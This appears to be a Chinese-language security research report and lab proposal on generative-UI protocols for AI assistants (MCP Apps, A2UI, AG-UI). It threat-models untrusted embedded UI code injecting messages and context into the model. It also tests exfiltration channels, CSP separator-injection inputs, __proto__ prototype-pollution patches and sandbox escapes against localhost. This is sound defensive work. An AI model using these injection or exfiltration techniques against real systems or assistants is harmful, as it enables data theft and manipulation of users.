1. 参考文档说 `targetOrigin` "Defaults to `*`"，`allowedTools` 是 "Optional client-side allowlist"；代码里渲染器从沙箱 URL 推导 origin（"never `'*'`"），`allowedTools` 省略即全拒。`[P]` 结果：**照抄官方指南的示例（没写 `allowedTools`），App 的每次工具调用都会被拒**——安全方向的不一致，但会让人误以为是服务端路由的问题。`[P2]`
2. `getMCPAppCSP(undefined)` 返回 `undefined`，`getMCPAppCSP({})` 返回完整的限制性策略。`[P]`（实测 T2）**不声明 CSP 比声明一个空 CSP 拿到的约束更少**——限制性默认值落到了开发者自己写的沙箱代理页上；MCP Apps 规范要求的是 "If `ui.csp` is omitted, Host MUST use restrictive default"。`[P2]`
3. `splitMCPAppTools` 对非数组的 `visibility` 本意是丢弃，但因为 `{...uiMeta, ...(visibility != null ? {visibility} : {})}` 的展开顺序，原始字符串被保留，随后 `"app".includes("app")` 走的是 `String.prototype.includes`。`[P]`（实测 T1：`visibility: "app"` 被判为 app-only）。无害但说明：**「数组的 includes」与「字符串的 includes」同名**，lab 的可见性函数必须先判 `Array.isArray`。
4. `ui/message`、`ui/update-model-context` 的 params 是 `unknown`，原样交给 handler；没配 handler 时返回 `{}`——App 以为消息发出去了。`[P]` 内容校验与来源标注全在宿主。

（AI SDK 示例服务端路由里 `appVisible.tools.some(tool => tool.name === name)` 是**单 server** 写法；多 server 宿主要按 server 分别判定——§2.3 的「同一 server」规则。`[P2]`）

## 8. 安全专题

### 8.1 信任方向：前端工程师的默认模型是反的

前端的默认威胁模型是「我的页面被别人嵌入」（frame-ancestors、X-Frame-Options）。MCP Apps 里**你是嵌入方，被嵌入的是不可信代码**，而且这段代码还拿到了一条进入模型上下文和工具调用的通道。四个参与方、两条不可信输入：

| 来源 | 进入哪里 | L14 视角 |
|---|---|---|
| View → 宿主 `tools/call` | server 工具 | 参数来源 = **app**（不是用户、不是模型）；可见性 + 同 server + 宿主策略三道闸，见 §2.3/§2.4 |
| View → 宿主 `ui/message` | 下一轮**用户**消息 | `role: "user"` 但内容来自第三方代码；规范只要求宿主 MAY 征询同意（§2.5）。宿主必须给它打来源标签，否则模型会把它当用户指令 `[P2]` |
| View → 宿主 `ui/update-model-context` | 模型上下文 | 覆盖式写入（§2.5）；是一条不经用户眼睛的间接注入通道 `[P2]` |
| agent → A2UI 消息 / AG-UI `STATE_DELTA` | 你的渲染器 / 你的状态树 | 声明式但带绑定和 URL（§5.5），patch 能写原型（§6.2） |

**L14 的「按参数来源授权」在这里的落地**：同一个 `delete_item` 工具，模型调用时走 L14 的审批规则；View 调用时它的参数来源是 app——宿主应当把 app 来源的破坏性调用当成**需要宿主自己画的确认框**，而不是信任 View 里画的「确定」按钮（View 能画出和宿主一模一样的按钮，§3.6）。`[P2]`

### 8.2 外泄通道清单

| 通道 | 被什么挡 | 状态 |
|---|---|---|
| `fetch`/XHR/WebSocket | CSP `connect-src`（仅声明的 `connectDomains`） | 实测：继承策略对 srcdoc 子文档生效，`fetch` 被 `connect-src` 拦（§10 E4）`[P]` |
| `<img>`/字体/媒体 | `img-src` 等（`resourceDomains`） | 实测：被 `img-src` 拦（§10 E2/E4）`[P]` |
| 嵌套 iframe | `frame-src`（`frameDomains`）；**但被嵌入页用它自己的 CSP**（OpenAI 文档原话，§4.1） | 一手直述 `[P]` |
| 表单提交 | `form-action`——**导航指令，不回退到 `default-src`**（CSP3 §6.4，"fallback" 只针对 fetch directive）。若表单 `target` 指向新窗口或顶层，则 `frame-src` 也管不到它 | 规范直述 + 推论 `[P]`/`[P2]`（见下文 E4） |
| `window.open` / `ui/open-link` | `allow-popups` + 宿主对 `ui/open-link` 的 scheme 白名单（AI SDK 限 http/https/mailto，§7.2） | 一手直述 `[P]`；A2UI 文档自相矛盾地同时「列出」和「省略」`allow-popups`（§5.8）`[P]` |
| A2UI Image/formatString URL | **目录层**（URL 属性必须字面量 + 主机白名单） | §5.5，一手拼合 `[P2]` |
| `ui/message` / `update-model-context` | 宿主的来源标签 + 内容校验 | 规范只给 MAY（§2.5）`[P]` |

**E4 实测**：代理页响应头 `default-src 'none'; script-src 'unsafe-inline'; frame-src 'self'`，内层是 `srcdoc` + `sandbox="allow-scripts allow-forms"`（无 same-origin，与 AI SDK/basic-host 的内层沙箱同形）。结果：
- `fetch('http://127.0.0.1…')` 跨源 → **被拦**，`securitypolicyviolation.violatedDirective === "connect-src"`（`connect-src` 未声明，回退到 `default-src 'none'`）。`[P]`
- `new Image().src = 'http://127.0.0.1…'` → **被拦**，`violatedDirective === "img-src"`。`[P]`
- `<form method=GET action='http://127.0.0.1…'>`（默认 target=自身 iframe）→ 这次**被 `frame-src 'self'` 拦住**（父文档报 `frame-src http://127.0.0.1:8765`），因为表单导航的是一个嵌套浏览上下文。

**但这正好暴露了 `form-action` 的坑**：挡住表单的是 `frame-src`，**不是** `form-action`（内层 CSP 里根本没有 `form-action`，也没有被回退补上——`default-src 'none'` 对表单目标无效）。一旦表单 `target="_blank"`（配合 `allow-popups`）或在一个 `frame-src` 更宽的策略下，没有 `form-action` 的表单就能把数据 GET 出去。这就是为什么 AI SDK 的 `getMCPAppCSP` **显式**写 `form-action 'none'`（和 `base-uri 'none'`），而 A2UI 内层给了 `allow-forms` 却把 CSP 交给第三方自己写（§5.8）。结论：**`default-src 'none'` 给人一种「全关了」的错觉，但表单目标和 base-uri 不在它的管辖内，必须单独写。** `[P]`+`[P2]`

### 8.3 clickjacking / 尺寸 / 指纹

- **clickjacking 反向**（§3.6）：受害者是宿主。View 能画出和宿主像素级一致的 UI；`frame-ancestors` 保护不了宿主，因为 View 是宿主**主动**嵌入的。防御是：破坏性操作的确认框由宿主在 iframe **之外**渲染。`[P2]`
- **尺寸**：`ui/notifications/size-changed` 的高度来自不可信 View，必须 clamp（basic-host `maxHeight` 6000，§2.5）；否则 View 报一个超大高度把宿主 UI 顶出视口，也是一种 UI redressing。`[P]`
- **指纹**：`hostContext.userAgent/locale/timeZone/platform` 是宿主主动交给第三方代码的（SHOULD 提供，§2.6）。对隐私敏感的宿主应按需裁剪。`[P]`+`[P2]`

### 8.4 2026 年的安全相关变更与「有没有正式公告」

我查了 GitHub Advisory DB（`api.github.com/advisories`，ecosystem=npm）对 `@modelcontextprotocol/ext-apps`、`@mcp-ui/{client,server}`、`@ag-ui/client`、`@ag-ui/mcp-apps-middleware`、`@copilotkit/runtime`、`@ai-sdk/{react,mcp}`：**全部 0 条**。`ext-apps` 仓库的 `security-advisories` 端点也是空。访问 2026-10-12。`[P]`

> **唯一命中**：`fast-json-patch`（AG-UI 客户端的实际依赖）有 **GHSA-8gh8-hqwg-xf34**，"Starcounter-Jack JSON-Patch Prototype Pollution vulnerability"，high，2022-12-25。`[P]` 这正是 §6.2 第 5 条的实锤：AG-UI 的状态 patch 跑在一个**曾因原型污染被登记过 advisory** 的库上。实测（§10 T3）当前 3.1.1 版默认 `banPrototypeModifications` 开启，`__proto__` 被拒；但 `applyPatch(doc, ops, true, false, /*ban=*/false)` 关掉后 `Object.prototype` 立刻被污染。AG-UI 客户端的调用是 `applyPatch(s, delta, true, false)`（四参，ban 默认开）——**安全，但安全靠的是库的默认值，不是 AG-UI 自己的校验**。`[P]`

**所以结论是：到 2026-10-12 为止没有针对这些生成式 UI 库的公开 CVE/GHSA。** 但 ext-apps 的 git 历史里有一串明确以安全为目的的修复（都是一手 commit，`api.github.com/repos/modelcontextprotocol/ext-apps/commits`，访问 2026-10-12）：

- **`c7ef5f00`（2026-01-07）"add source validation to default PostMessageTransport"**：原文 "Previously, the default transport only specified the target but not the source for validation, meaning apps would accept messages from **ANY window**." 同一 commit 让 sandbox proxy 从 `document.referrer` 取 `EXPECTED_HOST_ORIGIN`、发消息用具体 origin 而非 `*`。`[P]`
- **`2411c71a`（2026-01-07）"require eventSource in PostMessageTransport + add security tests"**。`[P]`
- **`5e4839d1`（2026-03-10）**：承认此前的跨 App 注入测试**一直是 no-op**（`contentDocument` 跨源为 null，`?.` 短路，postMessage 从未发出，测试却通过）。修复改用 `window.frames[0].frames[0]`。原文还纠正了一条注释："isolation comes from the **separate port**, not the sandbox attribute"——印证 §2.7：真正的边界是代理的 origin，不是 sandbox 属性。`[P]`
- **`8b09f427`（2026-01-11）"proper CSP handling… (HTTP headers, worker-src, document.write)"**：原文 "meta tag CSP can be tampered with by same-origin content"（§3.4 的 meta 注入面）；并记录了那个关键取舍 "Use `document.write()` instead of srcdoc for inner iframe content (srcdoc creates opaque origin that breaks WebGL…)"——这就是 §2.7 里内层为什么是 `document.write` 且 same-origin 的原因。`[P]`
- **`49957467`（2026-04-21）"forbid csp/permissions on McpUiToolMeta via never"**：类型层面禁止把 `csp`/`permissions` 写在**工具**的 `_meta.ui` 上（只能在**资源**上）。"Companion to … host-side console.warn." `[P]`
- **`c60ee352`（2026-02-12）"Change Host <> Sandbox communication protocol to SHOULD"**：原文 "In ChatGPT, we have our own sandbox <> host communication protocol that doesn't match … the MUST in the spec." —— §2.7 里「代理协议是 SHOULD」的来历，以及 OpenAI 自带一套的实证。`[P]`

把这串时间线交给学员，比任何「要校验 origin」的训诫都有说服力：**连协议作者自己最初的默认 transport 都接受任意窗口的消息，连他们自己的注入测试都曾空跑两个月。**

## 9. 采用现状

全部来自官方/一手页面，访问 2026-10-12。

**MCP Apps 是「第一个官方 MCP 扩展」**：VS Code 公告原文 "Today, the MCP community is announcing MCP Apps, **the first official MCP extension**."（`code.visualstudio.com/blogs/2026/01/26/mcp-apps-support`）`[P]`。规范日期 `2026-01-26` 与这篇公告同日（呼应 §2.0）。

**支持 MCP Apps 的宿主**（`modelcontextprotocol.io/docs/extensions/apps` → "Client support"，原文）："MCP Apps are currently supported by **Claude, Claude Desktop, VS Code GitHub Copilot, Microsoft 365 Copilot, Goose, Postman, MCPJam, and Archestra.AI**. See the client matrix for the full list…"。`[P]` ext-apps README 的徽章列表另给出 ChatGPT、mcp-use inspector、Alpic Playground 的文档链接。`[P]`

逐个核对到一手页面的：

- **VS Code**（公告原文）："VS Code is the **first major AI code editor** with full MCP Apps support. Available now in VS Code Insiders… expect this to roll out to VS Code Stable in next week's release."（2026-01-26）`[P]`
- **Claude**（`claude.com/docs/connectors/building/mcp-apps/getting-started`）：有完整开发指南；`ui.domain` 的格式是 "the first 32 hex characters of the SHA-256 of your server URL, followed by `.claudemcpcontent.com`"（每个 server 一个唯一子域，印证 §4.1 的 per-plugin 隔离思路）。`[P]`
- **ChatGPT**：OpenAI Apps SDK 以 MCP Apps 为准（§4.1 的 changelog，2026-02-22 "fully compatible"）。`[P]`
- **Goose / Postman / MCPJam / Microsoft 365 Copilot / Archestra.AI**：由 `modelcontextprotocol.io` 官方页列为支持；各自有文档链接。`[P]`（这些是官方清单，没有可核实的使用量数字——**无一手数字**。）

**A2UI**：项目方自述的生产部署见 §5.9（Google Opal、Gemini Enterprise、Flutter GenUI SDK、ADK Web），伙伴 AG-UI/CopilotKit "day-zero A2UI compatibility"。一手但利益相关，且 v1.0 仍是 Candidate、稳定版是 v0.9.1。`[P]`

**AG-UI**：`@ag-ui/client` npm 最新 `1.0.2`，`PROTOCOL_VERSION "1.0"`（§6.0）。CopilotKit 是其主要全栈实现。`[P]`

**一句话总览**：到 2026-10 为止，MCP Apps 已被两大聊天宿主（ChatGPT、Claude）+ 两个微软 Copilot + VS Code + 若干工具链宿主支持，是三者里宿主覆盖最广的；A2UI 主要在 Google 自家产品线；AG-UI 作为传输层被 CopilotKit 生态采用，并且是 A2UI 的推荐传输。`[P]`/`[P2]`

## 10. 本地实测

全部脚本在 `/tmp/genui/`，用真实的发行版库（`@ai-sdk/mcp@2.0.73`、`@modelcontextprotocol/ext-apps@2.0.3`、`@ag-ui/client@1.0.2` 依赖的 `fast-json-patch@3.1.1`、Python `jsonpatch@1.35`/`jsonpointer@3.2.1`）和 CDP 驱动的真实 Chromium（Electron 40 / Chrome 144）。下文每条都给了可复现命令。

### 10.1 可见性与 scheme（T1，Node）

`node /tmp/genui/t/t1_visibility.mjs`，比较「规范语义」「ext-apps 的 `isToolVisibilityAppOnly/ModelOnly`」「`@ai-sdk/mcp` 的 `splitMCPAppTools`」：

```
input             | spec m/a | ext-apps appOnly modelOnly | ai-sdk model/app
(omitted)         | Y/Y      | n                n         | Y/n
["model","app"]   | Y/Y      | n                n         | Y/Y
["app"]           | n/Y      | Y                n         | n/Y
["app","app"]     | n/Y      | n                n         | n/Y   ← 重复元素让 ext-apps 的 length===1 判定失效
["model"]         | Y/n      | n                Y         | Y/n
[]                | n/n      | n                n         | n/n
"app" (string)    | INVALID  | n                n         | n/Y   ← 非数组，ai-sdk 却因 String.includes 判成 app
["APP"]           | n/n      | n                n         | n/n
resourceUri a2ui://recipe-card  -> ext-apps THROW "Invalid UI resource URI" | ai-sdk THROW "Invalid MCP App resource URI"
resourceUri https://evil/x      -> 两者都 THROW
```

三条结论变成 lab 断言：`["app","app"]` 让 `isToolVisibilityAppOnly`（`length===1`）返回 false；省略 `visibility` 规范上对 app 可见、但 `splitMCPAppTools` 不放进 `appVisible`（比规范严）；字符串 `"app"` 本该非法却因 `"app".includes("app")` 判成 app 可见——**`Array.isArray` 必须先判**。scheme 校验两库都做（`a2ui://` 被拒，呼应 §5.8）。

### 10.2 CSP / allow 构造器（T2，Node）

`node /tmp/genui/t/t2_csp.mjs`，直接执行 `@ai-sdk/react` 的 `sandbox.ts`（原样拷贝）与 ext-apps 的 `buildAllowAttribute`：

```
connectDomains=["https://api.example.com"]            -> connect-src 'self' https://api.example.com
connectDomains=["https://a.example.com; script-src *"] -> connect-src 'self'        （分隔符注入被挡）
connectDomains=["https://a.example.com%3Bscript-src"]  -> connect-src 'self'        （%3B 解码后仍被挡）
connectDomains=["https://*"]                           -> connect-src 'self'        （裸 * 主机被挡）
connectDomains=["https://*.example.com"]               -> connect-src 'self' https://*.example.com  （子域通配放行）
connectDomains=["http://insecure.example.com"]         -> connect-src 'self'        （非 https/wss 被挡）
csp 省略（undefined）-> 返回 undefined               ← 不声明 = 不生成策略，约束反而更少
csp = {}            -> default-src 'none'; base-uri 'none'; form-action 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'self'; img-src 'self' data:; font-src 'self' data:; frame-src 'self'

ext-apps buildAllowAttribute({camera:{},microphone:{}})            = "camera; microphone"   （分号）
ai-sdk getMCPAppAllowAttribute(req cam+mic, host allows [mic])      = "microphone"           （deny-by-default）
ai-sdk getMCPAppAllowAttribute(req cam+mic, host allowlist 省略)    = undefined              （不给）
spec 示例代码的 join(' ')                                           = "camera microphone geolocation"  （空格——错，§2.9）
```

要点：两个 SDK 都**规范化后再查分隔符**（`new URL()` 解码 `%3B`，再 `/["'\`\s;,]/` 拒绝），比「黑名单删字符」稳，lab 照抄。`allow` 用 `;` 两库都对，规范示例文本用空格、错（§2.9）；`csp 省略→undefined` 反直觉，进 §8.2 清单。

### 10.3 JSON Patch applier（T3，Node + Python，跨语言对照）

`node /tmp/genui/t/t3_patch.mjs` 与 `python t3_patch.py`，同组用例喂两边真实库（Node 用 AG-UI 客户端实际调用的 `applyPatch(doc, ops, true, false)`）。两库对 §6.2 五类用例的判定**完全一致**：原子失败两边都不改原对象；`test 1==true` 两边都拒、`test 1==1.0` 两边都过（符合 §4.6）；`/arr/01`、`/arr/1e0` 两边都拒；`~01` 两边都正确解成键 `~1`；`move` 进自己子节点两边都拒；JS 的 `__proto__`/`constructor/prototype` 被库默认 ban 拒掉。

两个**跨语言的坑**（lab 要两边逐字节一致，必须手动抹平）：

1. **`True == 1`**：Python `True == 1`、`1 == 1.0`、`[1] == [True]` 全真。若 `test` 直接用 `==`，Python 会把 `true`/`1` 判等——违反 §4.6 "same JSON type"。两库恰好都先比类型，但**学员的朴素 applier 用 `==` 就会错**，lab 断言要抓到。
2. **`json.dumps(1.0)` → `"1.0"`，JS `JSON.stringify(1.0)` → `"1"`**（实测）。所以「观测输出逐字节一致」要求 lab 对数字序列化用统一规则。

朴素 applier 对照（同脚本后半）复现三个后果：遇错不回滚 → `{"a":2}` 半途态；`~` 解码反了 → 写错键；`obj[key]=v` 就地写 → `{}.naivePolluted === true`。另外：`applyPatch(…, /*ban=*/false)` 关掉第五参，`__proto__` 立刻污染成功——印证 §8.4 GHSA-8gh8-hqwg-xf34，**安全完全依赖库默认值**。

### 10.4 浏览器原语（真实 Chromium via CDP）

两源环境：同一个 Python server 监听一个端口，用 `localhost` 与 `127.0.0.1` 两个主机名得到两个 origin（`/tmp/genui/b/`）。

**B 组（`host.html`）——sandbox / 不透明源 / postMessage / Permissions Policy / document.write**：

```
B1  srcdoc + "allow-scripts allow-same-origin"（同源嵌入）：
    内层 origin = "null"，但 parent.document.title 读到 "genui-host"，
    且内层成功 removeAttribute('sandbox')（removedSandbox=true）。
    → 「allow-scripts + allow-same-origin 形同无沙箱」在同源 srcdoc 上成立（§3.1）。
B1b 跨源 src + 同样两个 flag：读 parent.document.title 抛 SecurityError。
    → 同一组 flag，跨源就安全——危险的前提是「同源」。
B2  srcdoc + "allow-scripts"（无 same-origin）：location.origin = self.origin = "null"；
    localStorage / document.cookie 均抛 SecurityError。  （§3.2 不透明源）
B3  向 B2（不透明源）发 postMessage，targetOrigin 写 "null"：
    抛 SyntaxError "Invalid target origin 'null'"。
    → 印证 §3.3 的推断：对不透明源目标，targetOrigin 只能用 "*"，没有「发给 null」这回事。
B4  allow="camera microphone"  -> featurePolicy.allowsFeature: camera=false, microphone=false
    allow="camera; microphone" -> featurePolicy.allowsFeature: camera=true,  microphone=true
    → 空格分隔整条失效，分号分隔才生效（§2.9 / §3.5，实锤）。
B6  先 allow-same-origin 加载，改成只 allow-scripts，再 document.write：
    内层 origin = "http://localhost:8765"，仍能读 parent.document.title。
    之后真正导航一次（换 srcdoc）：origin 变 "null"，读 parent 抛 SecurityError。
    → sandbox 属性的变更只在「下一次导航」生效；document.write 不是导航（§3.1）。
```

B6 直接关系 §2.7：basic-host 的内层是 `document.write` 写的，所以**后改 sandbox 属性不会收紧已在跑的文档**。

**origin 组（`origin_test.html`）——srcdoc 的 origin 到底是什么**：

```
srcdoc（无 sandbox）        : location.origin="null", self.origin="http://localhost:8765", href="about:srcdoc", event.origin="http://localhost:8765"
srcdoc + allow-scripts+same : 同上（event.origin 仍是宿主源）
srcdoc + allow-scripts only : location.origin="null", self.origin="null", event.origin="null"
```

即 srcdoc 的 `href` 是 `about:srcdoc`，**不带 sandbox 时继承创建者的源**（`event.origin` 是宿主源，不是 "null"），只有不含 `allow-same-origin` 的 sandbox 才变不透明源。印证 §3.4，也说明**收 srcdoc 子文档消息不能假设 origin 一定是 "null"**。

**CSP 继承组（`csp_host.html`，响应头 `img-src 'none'; frame-src *`）**：srcdoc 子文档（无论是否 `allow-scripts`）向跨源加载图片都 `blocked/error`，`securitypolicyviolation` 带着**父页完整 policy**（`img-src img-src 'none'; frame-src *`）；而换成真正跨源的 `src` 子页（无 CSP）图片 `loaded`。→ **srcdoc 继承父 CSP**（连 `originalPolicy` 都是父页的），这就是 MCP Apps 要靠「每 View 一个独立源代理文档」隔离 CSP 的原因——srcdoc 省不掉这一步。

**外泄组（`exfil_host.html`，`default-src 'none'; script-src 'unsafe-inline'; frame-src 'self'`）**：结果见 §8.2 E4——`fetch`/`img` 被拦、表单自导航被 `frame-src` 拦，而 `form-action` 不在 `default-src` 回退范围内、必须单独写。

> 复现：`cd /tmp/genui/b && python3 server.py 8765`，浏览器开 `http://localhost:8765/{host,origin_test,csp_host,exfil_host}.html`，读 `window.__results`。

## 11. Lab 提案

> 这是**提案**，不写进仓库。延续现有约定：`labs/shared/genui.{ts,py}` 纯函数参考实现（**零 DOM/IO/模型调用、不加依赖**），`labs/l16x/genui.{ts,py}` 学员填空（`My*` 前缀），`labs/l16x/verify.{ts,py}` 确定性断言（`WIRE_IMPL=shared` 先自检）。`package.json` 追加（**不改既有脚本**）：`genui`/`genui:py`/`verify:l16x`/`verify:l16x:py`/`ui:l16x`（Vite 端口 5317，可选演示页）。

### 11.1 为什么这一层能写成纯函数

同 L16 `wire.ts`：生成式 UI 的危险全在**协议与信任判定**，而这些判定「给定一个 JSON-RPC 消息 / 组件树 / sandbox 字符串，断言输出」都能确定性测试、一次模型不调。只能肉眼看的（画得好不好看）不进这层。L16x 比 L16 更该如此——**最承重的几条断言在真跑宿主时几乎撞不到**（恶意 server 声明、重复 visibility 元素、`__proto__` patch、`"null"` 源伪造），正是 verify 存在的理由。

### 11.2 shared API 草图（`genui.ts` / `genui.py` 同形）

```ts
// ── 一、宿主桥：方法白名单 + server 归属 + 双向可见性 ──
type Visibility = ("model" | "app")[]
// ★ 必须先 Array.isArray；字符串 "app".includes("app") 会骗过你（实测 T1）
function parseVisibility(v: unknown): Visibility | null
function isModelVisible(v: Visibility | undefined): boolean   // 省略 => true（规范默认）
function isAppVisible(v: Visibility | undefined): boolean      // 省略 => true（规范默认）；fail-CLOSED 变体见下
function isAppVisibleStrict(v: Visibility | undefined): boolean // app 方向：解析失败/省略 => false
const BRIDGE_METHODS: ReadonlySet<string> // ui/initialize, notifications/initialized, tools/call,
  // resources/read, resources/list, ui/message, ui/update-model-context, ui/open-link,
  // ui/request-display-mode, ui/size-changed, ui/resource-teardown …
interface ToolRef { name: string; server: string; visibility?: Visibility }
interface BridgeDecision { allow: boolean; reason: string }
// 核心闸门：一个 app 发起的请求能不能放行
function routeAppRequest(msg: JsonRpc, ctx: {
  appServer: string                 // 这个 View 属于哪个 server
  tools: ToolRef[]                   // 已知工具（带 server 与 visibility）
  allowedMethods?: ReadonlySet<string>
}): BridgeDecision
// 规则（每条对应一个 INV）：方法不在白名单 → 拒；tools/call 的工具不存在 → 拒；
// 工具 server !== appServer → 拒（同 server 规则）；!isAppVisibleStrict → 拒；否则放行。

// ── 二、出站队列：被 initialized 和「审批」双重门控 ──
class OutboundQueue {           // 对应 §2.5「结果必须缓冲到 initialized」
  onInitialized(): void
  enqueue(note: JsonRpcNotification): void   // initialized 前只进队列
  flush(): JsonRpcNotification[]             // initialized 后一次性放行，保持 FIFO
  // ★ tool-input 只在 input-available/output-available 阶段入队；approval-requested 阶段不入（AI SDK 行为）
}

// ── 三、来源与 origin 校验：拒绝「null 白名单」 ──
interface Peer { source: unknown; expectedWindow: unknown; origin: string; expectedOrigin: string | "*" }
function acceptsMessage(p: Peer): boolean
// 规则：source 必须 === expectedWindow（第一道，永远查）；
// expectedOrigin==="*" 时跳过 origin（仅当目标是不透明源代理，且已有 source 校验）；
// 否则 origin 必须 === expectedOrigin。★ 把 "null" 放进白名单 === 接受任何不透明源 → 显式报错。
function isOpaqueOriginString(o: string): boolean  // o === "null"
function safeTargetOrigin(peerOrigin: string): string // 不透明源 => "*"（唯一选项，B3 实测）

// ── 四、CSP 与 allow 构造器：规范化后再查分隔符 ──
function buildCsp(decl: { connectDomains?: string[]; resourceDomains?: string[]; frameDomains?: string[] }): string
// 只收 https/wss；new URL() 规范化（解码 %3B）；拒绝含 " ' ` 空白 ; , 的 origin；拒绝裸 * 主机；
// 显式写 default-src 'none'; base-uri 'none'; form-action 'none'（实测 E4：这三条不会被 default-src 补上）
function buildAllowAttr(req: Record<string, unknown>, hostAllow: string[]): string // 用 "; " 连接（不是空格）

// ── 五、sandbox 属性检查器 ──
function auditSandbox(attr: string, opts: { differentOrigin: boolean }): string[]
// 返回告警：allow-scripts + allow-same-origin 且 !differentOrigin → 「等于没有沙箱」；
// 含 allow-top-navigation* → 「可被 frame-busting」；缺 allow-scripts 而内容需要脚本 → 提示。

// ── 六、尺寸钳制 ──
function clampSize(reported: {height?: number; width?: number}, max = 6000): {height: number; width: number}

// ── 七、原子 JSON Patch（严格 test、禁原型、RFC 6901 下标）──
function decodePointerToken(tok: string): string  // 先 ~1→/ 再 ~0→~
function parseArrayIndex(tok: string): number | null // ABNF：无前导零，无 1e0/空白；非法 => null
function jsonTypeEqual(a: unknown, b: unknown): boolean // RFC6902 §4.6：先比 JSON 类型（抹平 Py True==1）
function applyPatchAtomic<T>(doc: T, ops: JsonPatchOp[]): { ok: true; doc: T } | { ok: false; reason: string }
// 对深拷贝应用；任一 op 失败整体回滚（返回原 doc）；拒绝 __proto__/constructor/prototype 键段。

// ── 八、A2UI 树与目录校验 ──
interface Catalog { components: Record<string, CompDef>; functions: Record<string, FnDef> }
function validateTree(components: A2uiComponent[], catalog: Catalog): TreeError[]
// 恰好一个 root；children 引用缺失 => 记为 placeholder（不是错误，规范要求）；
// 环检测、多父检测、深度上限（常量，声明来源）；组件必须在 catalog；allowedParents/Children；
// ★ URL 型属性（Image.url 等）必须是字面量字符串且主机在白名单；出现 DataBinding/FunctionCall/formatString => 报错（§5.5 外泄）。

// ── 九、ui/message 来源标注 ──
function tagProvenance(msg: UiMessage): { role: "user"; content: string; provenance: "mcp-app"; server: string }
// 把 View 发来的「用户消息」打上 app 来源标签，供上层决定是否需要用户确认（L14）。
```

Python 侧 `genui.py` **逐一对应**，签名尽量一致。两处跨语言坑由 shared 层吸收：`jsonTypeEqual` 内部对 Python 的 `bool`/`int`/`float` 显式分流（`True != 1`）；数字序列化用统一规则，保证观测实验输出逐字节一致。

### 11.3 观测实验（输出两语言逐字节一致）

每个实验是一张表，TS 与 Python 产出同样的文本（和 L16 的 `wire.ts` 观测段同风格）：

1. **E-VIS**：对 8 组 `visibility` 输入，打印 `model/app` 判定 + `isAppVisibleStrict` + 「SDK length===1 会怎么判」。重现 §10.1 的表。
2. **E-CSP**：对 8 个恶意 `connectDomains` 声明，打印生成的 `connect-src`，标出哪些被分隔符注入检查挡下。重现 §10.2。
3. **E-ALLOW**：`allow` 用空格 vs 分号，并排打印「浏览器会解析成几条指令」（静态模拟 §3.5 的 ABNF：空格 → 1 条含非法 token 的指令）。
4. **E-PATCH**：10 个 patch 用例，两列打印 `ok/reason`，专门高亮 `test true vs 1`、`/arr/01`、`~01`、`__proto__`。重现 §10.3。
5. **E-TREE**：喂一棵「a→b→a 成环」「root 缺失」「Image.url 是 formatString」的树，打印 TreeError 列表。
6. **E-ORIGIN**：对 `{source,origin}` 的若干组合打印 `acceptsMessage`，含「把 null 加白名单」反例。

### 11.4 学员 TODO（6 个，★ = 必做，★★ = 进阶）

- **TODO-1 ★ `routeAppRequest`**：实现方法白名单 + 同 server + `isAppVisibleStrict`。（INV-6/7/8）
- **TODO-2 ★ `acceptsMessage` / `safeTargetOrigin`**：source 优先、拒绝 null 白名单、不透明源只能 `*`。（INV-11/12/13）
- **TODO-3 ★ `buildCsp`**：规范化后查分隔符，显式写 `form-action/base-uri 'none'`。（INV-18/19/20）
- **TODO-4 ★ `applyPatchAtomic`**：深拷贝 + 整体回滚 + 严格 `test` + 禁原型 + RFC6901 下标。（INV-21~25）
- **TODO-5 ★★ `validateTree`**：一个 root、环检测、多父、目录成员、URL 属性必须字面量。（INV-14~17）
- **TODO-6 ★★ `OutboundQueue`**：`initialized` 前缓冲、审批前不发 tool-input、FIFO。（INV-4/5）

### 11.5 verify 断言（48 条，TS 与 Python 条数一致，每条映射一个 INV）

分六组，沿用 L16 的编号风格（`V/O/C/P/T/A`）：

| 组 | 覆盖 | 条数 | 典型断言（→INV） |
|---|---|---|---|
| **V 可见性/路由** | §2.3/2.4、§7.2 | 10 | 省略→model 但 strict app=false（INV-6）；`["app","app"]` 下 app=true 而 SDK length===1=false（INV-7）；字符串 `"app"` 非法（INV-9）；跨 server 工具拒（INV-8）；非白名单方法拒（INV-6） |
| **O 出站门控** | §2.5 | 6 | initialized 前 enqueue 不输出（INV-4）；flush 后 FIFO（INV-4）；approval-requested 不发 tool-input（INV-5） |
| **C CSP/allow/sandbox** | §2.7–2.9、§3.1/3.5、§8.2 | 10 | `%3B` 注入被挡（INV-18）；裸 `*` 主机被挡（INV-19）；输出含 `form-action 'none'`（INV-20）；allow 用 `;`（INV-20）；allow-scripts+same-origin 且同源→告警（INV-10）；omit csp≠空 csp（INV-19） |
| **P JSON Patch** | §6.2、§8.4 | 10 | 第二 op 失败整体回滚（INV-21）；`test` 下 `1`≠`true`（INV-23）；`1`==`1.0`（INV-23）；`/arr/01` 拒（INV-24）；`~01`→键`~1`（INV-22）；`__proto__` 拒（INV-25） |
| **T A2UI 树** | §5.3–5.5 | 8 | 恰好一个 root（INV-14）；环被检出（INV-15）；多父被检出（INV-15）；缺失引用记 placeholder 非错误（INV-14）；`catalogId` 不 fetch（INV-16）；Image.url=formatString 被拒（INV-17） |
| **A 来源/注入** | §8.1、L14 | 4 | source≠expected 拒（INV-11）；origin 白名单含 `"null"` 报错（INV-12）；`ui/message` 被打 `provenance:"mcp-app"`（INV-26）；`update-model-context` 覆盖语义（INV-27） |

`WIRE_IMPL=shared` 时 48 条全绿；学员实现逐步点亮。Python 侧同 48 条、同编号、同输入、同期望文本。

### 11.6 可选浏览器演示页（`l16x/ui/`）

一个 Vite 页，左边一个「恶意 server 声明」编辑框，右边实时显示：`buildCsp` 的输出、`auditSandbox` 的告警、以及一个**真的** iframe（同源 vs 独立源两种模式切换），让学员亲眼看到 §10.4 的 B1/B6/CSP 继承。**纯本地、无模型调用**，和 L16 的 `ui/` 定位一致。

### 11.7 与 L10 / L14 / L16 的边界（给讲师）

- **L10（MCP）**：L10 教 server/client/工具/资源和 2026-07-28 的握手。L16x **只新增** `_meta.ui`、`ui://` 资源、以及 postMessage 这条**第二传输**。不重复讲 MCP 基础；只讲「UI 把资源变成模板、把 View 变成第二个 client」。
- **L14（注入/按来源授权）**：L14 给了「按参数来源授权」。L16x 新增**一个来源**——`app`（View 发起的 `tools/call`/`ui/message`/`update-model-context`）。不重复讲注入原理；只讲「第三方 UI 代码是一个新的、默认不可信的参数来源」。
